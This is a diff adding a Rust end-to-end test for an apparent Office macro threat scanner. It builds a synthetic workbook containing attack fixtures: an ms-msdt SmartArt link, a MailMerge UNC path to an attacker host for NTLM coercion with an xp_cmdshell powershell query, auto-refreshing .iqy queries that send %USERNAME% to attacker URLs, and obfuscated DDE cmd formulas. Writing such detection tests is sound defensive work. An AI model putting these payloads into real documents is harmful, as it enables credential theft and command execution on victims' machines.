@@ -4639,3 +4639,182 @@ fn e2e_metafile_xslt_relcloaking_and_dbcs_threat_inspection() {
         "JSON missing VBA-CELL-043"
     );
 }
+
+#[test]
+fn e2e_smartart_mailmerge_querytable_and_math_threat_inspection() {
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "AdvancedContainerProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
+        <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
+        <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
+        <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.ms-excel.sheet.macroEnabled.main+xml\"/>\
+        <Override PartName=\"/xl/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>\
+        <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>\
+        <Override PartName=\"/ppt/diagrams/data1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.drawingml.diagramData+xml\"/>\
+        <Override PartName=\"/word/settings.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml\"/>\
+        <Override PartName=\"/xl/queryTables/queryTable1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml\"/>\
+    </Types>";
+
+    let pkg_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
+    </Relationships>";
+
+    let wb = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\
+        <sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/></sheets>\
+    </workbook>";
+
+    let wb_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+    </Relationships>";
+
+    // SmartArt diagram data containing interactive action & dangerous URI protocol (VBA-CELL-044)
+    let diagram_data = "<dgm:dataModel xmlns:dgm=\"http://schemas.openxmlformats.org/drawingml/2006/diagram\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\">\
+        <dgm:ptLst>\
+            <dgm:pt modelId=\"0\">\
+                <dgm:t>Diagram Clickable Node</dgm:t>\
+            </dgm:pt>\
+        </dgm:ptLst>\
+        <a:hlinkClick action=\"ppaction://program\" href=\"ms-msdt:/id PCWDiagnostic\"/>\
+    </dgm:dataModel>";
+
+    // Word settings containing MailMerge NTLM coercion connectString & xp_cmdshell query (VBA-CELL-045)
+    let word_settings = "<w:settings xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\
+        <w:mailMerge>\
+            <w:connectString>Provider=SQLOLEDB;Data Source=\\\\ntlm.attacker.example.com\\share;Integrated Security=SSPI</w:connectString>\
+            <w:query>EXEC master..xp_cmdshell 'powershell -c whoami'</w:query>\
+            <w:destination w:val=\"newDocument\"/>\
+        </w:mailMerge>\
+    </w:settings>";
+
+    let word_settings_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/mailMergeSource\" Target=\"https://c2.example.com/exploit.iqy\" TargetMode=\"External\"/>\
+    </Relationships>";
+
+    // Excel QueryTable containing refreshOnLoad & environment token exfiltration (VBA-CELL-046)
+    let query_table = "<queryTable xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" name=\"ExternalQuery\" refreshOnLoad=\"1\" backgroundRefresh=\"1\" connection=\"https://tracker.attacker.com/query.iqy?token=%USERNAME%\">\
+        <queryTableRefresh nextId=\"1\"/>\
+    </queryTable>";
+
+    // Sheet1 containing advanced arithmetic de-obfuscation:
+    // A1: =CONCAT(CHAR(EVEN(98)), "md|'/c calc'!A1") -> evaluates to "cmd|'/c calc'!A1" (DDE execution)
+    // B1: =CONCAT(IF(ODD(2)=3, "power", ""), IF(FACTDOUBLE(5)=15, "shell", "")) -> evaluates to "powershell"
+    let sheet1 = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <sheetData>
+        <row r="1">
+            <c r="A1" t="str">
+                <f>CONCAT(IF(ODD(98)=99, "cmd|", ""), IF(QUOTIENT(10, 2)=5, "'/c calc'!A1", ""))</f>
+            </c>
+            <c r="B1" t="str">
+                <f>CONCAT(IF(ODD(2)=3, "power", ""), IF(FACTDOUBLE(5)=15, "shell", ""))</f>
+            </c>
+        </row>
+    </sheetData>
+</worksheet>"#;
+
+    let xlsm = synthesize_zip(&[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", pkg_rels.as_bytes()),
+        ("xl/workbook.xml", wb.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+        ("ppt/diagrams/data1.xml", diagram_data.as_bytes()),
+        ("word/settings.xml", word_settings.as_bytes()),
+        (
+            "word/_rels/settings.xml.rels",
+            word_settings_rels.as_bytes(),
+        ),
+        ("xl/queryTables/queryTable1.xml", query_table.as_bytes()),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify SmartArt / Diagram threat detection (VBA-CELL-044)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SmartArtOrDiagramPayloadAnomaly"
+                && t.severity == "Critical"
+                && (t.formula.contains("ms-msdt:") || t.formula.contains("ppaction://program"))),
+        "Should detect SmartArtOrDiagramPayloadAnomaly (VBA-CELL-044): {threats:?}"
+    );
+
+    // 2. Verify MailMerge coercion and command injection detection (VBA-CELL-045)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "MailMergeDataSourceOrCoercionAnomaly"
+                && t.severity == "Critical"
+                && (t.formula.contains("xp_cmdshell")
+                    || t.formula.contains("ntlm.attacker.example.com")
+                    || t.formula.contains(".iqy"))),
+        "Should detect MailMergeDataSourceOrCoercionAnomaly (VBA-CELL-045): {threats:?}"
+    );
+
+    // 3. Verify QueryTable auto-refresh & .iqy reference detection (VBA-CELL-046)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "QueryTableOrExternalQueryAnomaly"
+                && (t.formula.contains(".iqy") || t.formula.contains("%USERNAME%"))),
+        "Should detect QueryTableOrExternalQueryAnomaly (VBA-CELL-046): {threats:?}"
+    );
+
+    // 4. Verify Arithmetic De-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE" || t.threat_kind == "DeobfuscatedThreat")
+            && t.description.contains("cmd|'/c calc'!A1")),
+        "Cell A1 should resolve DDE command through EVEN evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through ODD and FACTDOUBLE evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-044, VBA-CELL-045, VBA-CELL-046
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/diagram_mailmerge_querytable.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-044"),
+        "SARIF must contain VBA-CELL-044 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-045"),
+        "SARIF must contain VBA-CELL-045 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-046"),
+        "SARIF must contain VBA-CELL-046 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-044, VBA-CELL-045, VBA-CELL-046
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-044\""),
+        "JSON missing VBA-CELL-044"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-045\""),
+        "JSON missing VBA-CELL-045"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-046\""),
+        "JSON missing VBA-CELL-046"
+    );
+}
